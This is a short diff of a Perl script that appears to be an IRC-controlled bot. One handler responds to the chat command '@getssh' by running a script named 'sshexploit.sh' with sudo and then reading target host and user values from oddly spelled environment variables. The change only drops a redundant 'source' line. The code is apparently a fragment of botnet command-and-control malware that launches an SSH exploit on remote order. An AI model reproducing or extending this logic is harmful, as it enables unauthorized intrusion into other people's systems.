@@ -67,7 +67,6 @@ $irc->on(irc_privmsg => sub {
  }
   if ($msg =~ /@.getssh/) {
   system 'sudo sh sshexploit.sh';
-  system 'source sshexploit.sh';
   warn 'Getting SSH...';
   $h0st = $ENV{'H0ST'};
   $us3r = $ENV{'US3R'};
